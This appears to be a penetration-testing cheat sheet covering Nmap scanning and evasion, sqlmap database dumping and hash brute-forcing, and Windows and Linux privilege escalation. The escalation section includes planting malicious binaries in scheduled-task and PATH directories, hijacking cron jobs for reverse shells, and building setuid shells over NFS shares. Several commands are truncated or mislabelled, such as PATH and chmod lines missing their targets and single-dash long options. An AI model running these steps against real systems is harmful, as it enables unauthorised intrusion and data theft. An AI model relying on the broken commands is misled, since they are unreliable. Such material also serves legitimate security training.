Reconnaissance

Nmap - Network mapper for port scanning and service enumeration.

Target Specification

  • Scan a single IP: nmap 192.168.1.1
  • Scan specific IPs: nmap 192.168.1.1 192.168.2.1
  • Scan a range: nmap 192.168.1.1-254
  • Scan a domain: nmap scanme.nmap.org
  • Scan using CIDR: nmap 192.168.1.0/24
  • Scan targets from a file: nmap -iL targets.txt
  • Scan random hosts: nmap -iR 100
  • Exclude listed hosts: nmap -exclude 192.168.1.1

Nmap Scan Techniques

  • TCP SYN scan (Default): nmap 192.168.1.1 -sS
  • TCP connect scan: nmap 192.168.1.1 -sT
  • UDP port scan: nmap 192.168.1.1 -sU
  • TCP ACK port scan: nmap 192.168.1.1 -sA
  • TCP Window port scan: nmap 192.168.1.1 -sW
  • TCP Maimon port scan: nmap 192.168.1.1 -sM

Host Discovery

  • No Scan (List targets only): nmap 192.168.1.1-3 -sL
  • Disable port scanning (Host discovery only): nmap 192.168.1.1/24 -sn
  • Disable host discovery (Port scan only): nmap 192.168.1.1-5 -Pn
  • TCP SYN discovery on port x: nmap 192.168.1.1-5 -PS22-25,80
  • TCP ACK discovery on port x: nmap 192.168.1.1-5 -PA22-25,80
  • UDP discovery on port x: nmap 192.168.1.1-5 -PU53
  • ARP discovery on local network: nmap 192.168.1.1-1/24 -PR
  • Never do DNS resolution: nmap 192.168.1.1 -n

Port Specification

  • Port scan for port x: nmap 192.168.1.1 -p 21
  • Port range: nmap 192.168.1.1 -p 21-100
  • Scan multiple TCP/UDP ports: nmap 192.168.1.1 -p U:53,T:21-25,80
  • Scan all ports: nmap 192.168.1.1 -p-
  • Port scan from service name: nmap 192.168.1.1 -p http,https
  • Fast port scan (100 ports): nmap 192.168.1.1 -F
  • Scan top x ports: nmap 192.168.1.1 -top-ports 2000
  • Leaving off initial port in range: nmap 192.168.1.1 -p-65535
  • Leaving off end port in range: nmap 192.168.1.1 -p0-

Service and Version Detection

  • Service version detection: nmap 192.168.1.1 -sV
  • Set version intensity (0-9): nmap 192.168.1.1 -sV -version-intensity 8
  • Light mode (Faster): nmap 192.168.1.1 -sV -version-light
  • Intensity level 9 (Slower): nmap 192.168.1.1 -sV -version-all
  • Enable OS detection, version detection, script scanning, and traceroute: nmap 192.168.1.1 -A

OS Detection

  • Remote OS detection: nmap 192.168.1.1 -O
  • OS detection with limited open/closed ports: nmap 192.168.1.1 -O -osscan-limit
  • Aggressive OS guessing: nmap 192.168.1.1 -O -osscan-guess
  • Set maximum OS detection tries: nmap 192.168.1.1 -O -max-os-tries 1
  • Enable OS detection, version detection, script scanning, and traceroute: nmap 192.168.1.1 -A

Timing and Performance

  • Paranoid (IDS evasion): nmap 192.168.1.1 -T0
  • Sneaky (IDS evasion): nmap 192.168.1.1 -T1
  • Polite (less bandwidth/resource usage): nmap 192.168.1.1 -T2
  • Normal (default speed): nmap 192.168.1.1 -T3
  • Aggressive (fast/reliable network): nmap 192.168.1.1 -T4
  • Insane (extraordinarily fast network): nmap 192.168.1.1 -T5

Timing and Performance Switches

  • Timeout after x: nmap 192.168.1.1 -host-timeout 1s
  • Specify RTT time: nmap 192.168.1.1 -min-rtt-timeout 1s
  • Parallel host scan group sizes: nmap 192.168.1.1 -scan-delay 1s

    • NSE Scripts

    • List all available scripts: nmap --script-help=
    • Run a specific script: nmap --script script_name
    • Run multiple scripts: nmap --script script1,script2
    • Use a script category: nmap --script category

    Firewall/IDS Evasion Techniques

    • Fragment packets: nmap -f
    • Use a decoy: nmap -D RND:10
    • Use a spoofed IP address: nmap -S 192.168.1.100
    • Randomize target order: nmap --randomize-hosts
    • Change source port: nmap --source-port 53
    • Idle scan (stealth scan): nmap -sI 192.168.1.100

SQLMAP - Automatic SQL injection and database takeover tool.

Basic Usage

  • Scan a URL for SQL vulnerabilities: sqlmap -u "http://example.com/vulnerable.php?id=1"
  • Specify Request Method: sqlmap -u "http://example.com/vulnerable.php?id=1" --method POST
  • Specify Request Data: sqlmap -u "http://example.com/vulnerable.php?id=1" --data="id=1&submit=Submit"
  • Enumerate Database Information: sqlmap -u "http://example.com/vulnerable.php?id=1" --dbs
  • Enumerate Tables: sqlmap -u "http://example.com/vulnerable.php?id=1" -D database_name --tables
  • Dump Table Data: sqlmap -u "http://example.com/vulnerable.php?id=1" -D database_name -T table_name --dump

Advanced Options

  • Identify SQL Injection Type: sqlmap -u "http://example.com/vulnerable.php?id=1" --technique=BEUST
  • Bypass WAF/IDS: sqlmap -u "http://example.com/vulnerable.php?id=1" --tamper="between,space2comment"
  • Brute Force Password Hashes: sqlmap -u "http://example.com/vulnerable.php?id=1" --passwords --batch
  • Use a Session File: sqlmap -u "http://example.com/vulnerable.php?id=1" --session=session_file

Scheduled Tasks

Use the following commands to gather information about scheduled tasks:

  • schtasks /query /fo LIST /v - Query scheduled tasks and save to schtasks.txt locally. Then run: 
    cat schtasks.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
  • dir %SystemRoot%\Tasks - List scheduled tasks in the default directory.
  • e.g. c:\windows\tasks\ - Alternate location for scheduled tasks.
  • e.g. c:\windows\system32\tasks\ - Alternate location for scheduled tasks.
  • accesschk.exe -dqv "E:\GrabLogs" - Check permissions on the scheduled tasks binary directory.
  • copy evil-tftp.exe E:\GrabLogs\tftp.exe - If write permissions are available, copy a file to the scheduled tasks directory.
Startups and Autoruns

Use the following commands to gather information about startup programs and autoruns:

  • reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run - Query the registry for startup programs set for the current user.
  • reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run - Query the registry for startup programs set for all users.
  • wmic startup get caption,command - List startup programs and their commands.
  • reg query HKLM\Software\Microsoft\Windows\CurrentVersion\R - Query the registry for autorun entries.
  • reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce - Query the registry for one-time run entries for the current user.
  • dir "C:\Documents and Settings\All Users\Start Menu\Programs\Startup" - List startup programs for all users.
  • dir "C:\Documents and Settings\%username%\Start Menu\Programs\Startup" - List startup programs for the current user.
  • accesschk64.exe /accepteula -wvu "C:\Program Files\Autorun Program" - Check access permissions on startup directories. If writable, you can place malicious binaries.

DLL Hijacking

Understanding DLL Search Order

You can see the DLL search order on 32-bit systems below:

  1. The directory from which the application loaded
  2. 32-bit System directory (C:\Windows\System32)
  3. 16-bit System directory (C:\Windows\System)
  4. Windows directory (C:\Windows)
  5. The current working directory (CWD)
  6. Directories in the PATH environment variable (system then user)

As a low privilege user, we have little hope of putting a malicious DLL in directories 1-4. Directory 5 is not a possibility in this case because we are dealing with a Windows service, but if we have write access to any of the directories in the Windows PATH, we can exploit this.

Linux Kernel Exploits

After finding the version of the kernel, you can search for an appropriate exploit. Tools like “Linux Exploit Suggester” can assist in finding suitable exploits.

Once you have the exploit, transfer the payload from your machine to the target machine, execute it, and you should gain higher privileges.

For example, using an overlayfs exploit successfully resulted in elevated privileges.

Sudo

One of the first steps when you gain access to a machine is to run sudo -l. This command lists all the files you can run as root without needing a password.

If you find any executable that you can run, visit GTFOBins to check if the specified program is a system program or if you can modify it with /bin/sh to gain a shell.

GTFOBins can be a lifesaver in these situations!

SUID (Set owner User ID)

SUID is a permission that allows specific files to be run with the privileges of the file's owner, usually root. This can be very useful for privilege escalation.

To find all SUID files, use the command:

find / -perm -u=s -type f 2>/dev/null

After listing the SUID files, search for potential exploits or methods to bypass the permissions on GTFOBins.

Capabilities

Capabilities are similar to SUID but provide a subset of root privileges to a process or a binary, rather than full root access.

To list all binaries with capabilities, use the command:

getcap -r / 2>/dev/null

Find the binaries with capabilities and check them on GTFOBins for functions related to capabilities. Try the suggested methods to see if any work for privilege escalation.

Cron Jobs

Cron jobs are used for scheduling tasks to run automatically at specified intervals. By default, they run with the privileges of the owner of the cron job.

To view the crontab configuration, use:

cat /etc/crontab

Check the cron jobs listed. If you have permission to edit any of them, you can modify the job to execute a reverse shell or another payload. Monitor your listener to catch the reverse shell when the cron job runs.

PATH

The PATH environment variable specifies the directories where executable files are located. When you run a command without specifying its full path, the system searches the directories listed in PATH to find the executable.

To view the current PATH, use:

echo $PATH

The output will be a colon-separated list of directories, such as:

/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin

If you find writable directories in PATH, you can place a malicious script or binary there. To find writable paths, use:

find / -writable 2>/dev/null

For example, if you discover a writable path where a script called "thm" exists, and you can run it as ROOT, you can create a binary that executes a shell:

echo "/bin/bash" > thm

Make it executable:

chmod +x thm

Add the directory to PATH:

export PATH=:$PATH

Now, when you run the binary, it will execute with root privileges if the script is located in the writable path and is executable.

NFS (Network File Sharing)

To view the NFS (Network File System) configuration, use:

cat /etc/exports

Alternatively, you can find mountable shares from your machine with:

showmount -e <target IP>

Look for directories with the no_root_squash option, which means the share is writable and can be exploited for privilege escalation.

Once you've identified writable shares, create a directory on your attacker machine (e.g., /tmp), and mount the target share:

mount -o rw <targetIP>:<share-location> <directory path we created>

Navigate to the mounted directory and create a binary that grants root privileges:

echo "/bin/bash" >

Make the binary executable and set the setuid bit to grant root privileges:

chmod +x
chmod +s

Go back to the target machine, navigate to the mounted share, and execute the binary to get root privileges.
